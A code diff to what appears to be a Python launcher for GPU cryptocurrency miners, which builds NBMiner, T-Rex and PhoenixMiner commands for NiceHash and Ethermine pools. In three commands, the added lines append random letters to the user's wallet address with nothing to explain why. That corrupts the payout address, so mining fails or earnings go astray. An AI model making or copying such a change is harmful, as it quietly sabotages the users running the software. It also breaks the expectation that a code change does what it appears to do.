@@ -1,6 +1,9 @@
 import os
 import sys
 import json
+import random
+import string
+
 
 try:
     from time import sleep
@@ -83,7 +86,7 @@ if select_pool == "1":
     if select == "2":
         os.system("OptimizeGPU.bat")
         os.system(
-            r"Miners\NBMiner\nbminer.exe -a ethash -o nicehash+tcp://daggerhashimoto." + region + ".nicehash.com:3353 -u " + (nicehash_wallet) + r" -d 0 --no-watchdog" + " " + (miner_commands))
+            r"Miners\NBMiner\nbminer.exe -a ethash -o nicehash+tcp://daggerhashimoto." + region + ".nicehash.com:3353 -u " + (nicehash_wallet) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + r" -d 0 --no-watchdog" + " " + (miner_commands))
 
     if select == "3":
         os.system("OptimizeGPU.bat")
@@ -103,7 +106,7 @@ if select_pool == "1":
     if select == "6":
         os.system("OptimizeGPU.bat")
         os.system(r"Miners\Trex\t-rex.exe --algo kawpow --url stratum+tcp://kawpow." +
-                  region + ".nicehash.com:3385 --user " + (nicehash_wallet) + " " + (miner_commands))
+                  region + ".nicehash.com:3385 --user " + (nicehash_wallet) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + " " + (miner_commands))
 
     if select == "7":
         os.system("OptimizeGPU.bat")
@@ -191,7 +194,7 @@ if select_pool == "2":
     if select == "3":
         os.system("OptimizeGPU.bat")
         os.system(r"Miners\PhoenixMiner-5.6d\PhoenixMiner.exe -pool ssl://" +
-                  region + ".ethermine.org:5555 -ewal " + (ethermine_wallet) + (miner_commands))
+                  region + ".ethermine.org:5555 -ewal " + (ethermine_wallet) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + (miner_commands))
 
     if select == "4":
         os.system("OptimizeGPU.bat")
